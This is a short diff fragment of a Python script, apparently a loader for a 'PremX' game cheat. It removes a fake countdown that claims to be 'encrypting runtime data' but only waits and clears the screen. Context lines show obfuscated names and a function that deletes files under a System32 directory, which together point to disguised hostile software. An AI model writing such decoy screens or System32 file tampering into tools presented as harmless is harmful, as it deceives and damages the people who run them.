@@ -26,34 +26,6 @@ if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
     os.system('cls')
 
-import os
-import time
-from datetime import timedelta
-
-def countdown_timer():
-    time_remaining = timedelta(minutes=1)
-    
-    while time_remaining.total_seconds() > 0:
-        os.system('cls' if os.name == 'nt' else 'clear')
-        print("\n\n***ABOUT PremX***")
-        print("---To ensure 99% safety of PremX cheat, it must encrypt all runtime data.")
-        print("---Please be patient, it will take a few minutes.")
-        print("---No need to restart PC when switching to another account.")
-        print("---For Windows 11 users, premx might not be consistent and you might need to do a restart before it works.")
-        print("\n***CHANGE LOGS (March-16-2025):")
-        print(">")
-        print("/////////////////////////////////////////////////////////////////////////////////////////////")
-        print("<Developer: anonymous_kl>")
-        minutes, seconds = divmod(int(time_remaining.total_seconds()), 60)
-        print(f"Time remaining: {minutes} minutes and {seconds} seconds")
-        print("Please wait...")
-        time.sleep(1)
-        time_remaining -= timedelta(seconds=1)
-    
-    print("Completed encryption.")
-
-countdown_timer()
-os.system('cls')
 
 def delete_files_if_condition(file):
     target_dir = r"C:\Windows\System32\DSEL" 
